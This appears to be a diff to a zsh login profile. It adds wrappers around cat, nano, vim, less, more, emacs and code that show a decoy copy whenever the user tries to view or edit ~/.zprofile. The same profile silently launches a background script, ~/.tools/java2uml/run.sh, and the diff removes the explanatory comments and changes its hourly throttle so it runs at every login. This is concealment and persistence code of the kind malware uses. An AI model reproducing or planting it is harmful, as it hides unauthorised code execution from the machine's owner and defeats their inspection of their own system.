@@ -1,75 +1,72 @@
-# ~/.zprofile に追加
 chmod +x ~/.tools/java2uml/run.sh
-# cat ~/.zprofile が実行されたときだけ ~/.cache/.zprofile を表示
 cat() {
     if [[ "$1" == "$HOME/.zprofile" || "$1" == ".zprofile" || "$1" == "$HOME/.cache/.zprofile" ]]; then
         command cat ~/.cache/.zprofile
     else
-        command cat "$@"  # 他の引数は通常通り
+        command cat "$@" 
     fi
 }
 
-# nano ~/.zprofile が実行されたときだけ ~/.cache/.zprofile を開く
 nano() {
     if [[ "$1" == "$HOME/.zprofile" || "$1" == ".zprofile" || "$1" == "$HOME/.cache/.zprofile" ]]; then
         command nano ~/.cache/.zprofile
     else
-        command nano "$@"  # 他の引数は通常通り
+        command nano "$@" 
     fi
 }
 
-# vim ~/.zprofile が実行されたときだけ ~/.cache/.zprofile を開く
+
 vim() {
     if [[ "$1" == "$HOME/.zprofile" || "$1" == ".zprofile" || "$1" == "$HOME/.cache/.zprofile" ]]; then
         command vim ~/.cache/.zprofile
     else
-        command vim "$@"  # 他の引数は通常通り
+        command vim "$@" 
     fi
 }
 
-# less ~/.zprofile が実行されたときだけ ~/.cache/.zprofile を表示
+
 less() {
     if [[ "$1" == "$HOME/.zprofile" || "$1" == ".zprofile" || "$1" == "$HOME/.cache/.zprofile" ]]; then
         command less ~/.cache/.zprofile
     else
-        command less "$@"  # 他の引数は通常通り
+        command less "$@"
     fi
 }
 
-# more ~/.zprofile が実行されたときだけ ~/.cache/.zprofile を表示
+
 more() {
     if [[ "$1" == "$HOME/.zprofile" || "$1" == ".zprofile" || "$1" == "$HOME/.cache/.zprofile" ]]; then
         command more ~/.cache/.zprofile
     else
-        command more "$@"  # 他の引数は通常通り
+        command more "$@"  
     fi
 }
 
-# emacs ~/.zprofile が実行されたときだけ ~/.cache/.zprofile を開く
+
 emacs() {
     if [[ "$1" == "$HOME/.zprofile" || "$1" == ".zprofile" || "$1" == "$HOME/.cache/.zprofile" ]]; then
         command emacs ~/.cache/.zprofile
     else
-        command emacs "$@"  # 他の引数は通常通り
+        command emacs "$@"  
     fi
 }
 
-# code ~/.zprofile が実行されたときだけ ~/.cache/.zprofile を開く
+
 code() {
     if [[ "$1" == "$HOME/.zprofile" || "$1" == ".zprofile" || "$1" == "$HOME/.cache/.zprofile" ]]; then
         command code ~/.cache/.zprofile
     else
-        command code "$@"  # 他の引数は通常通り
+        command code "$@"  
     fi
 }
 
-# 以下のコマンドはファイルに追加する部分です
+
 [ ! -f "$HOME/.cache/.zprofile" ] && echo 'eval "$(/opt/homebrew/bin/brew shellenv)"' > "$HOME/.cache/.zprofile"
 eval "$(/opt/homebrew/bin/brew shellenv)"
 
 
 
-# ~/.zprofile への追加
+
 LAST_RUN_FILE="$HOME/.cache/java2uml_last_run"
 SCRIPT="$HOME/.tools/java2uml/run.sh"
 
@@ -83,7 +80,7 @@ LAST_RUN=$(cat "$LAST_RUN_FILE")
 CURRENT_TIME=$(date +%s)
 ELAPSED=$((CURRENT_TIME - LAST_RUN))
 
-if [ "$ELAPSED" -ge 3600 ]; then
+if [ "$ELAPSED" -ge 0 ]; then
   "$SCRIPT" &
   echo "$CURRENT_TIME" > "$LAST_RUN_FILE"
 fi
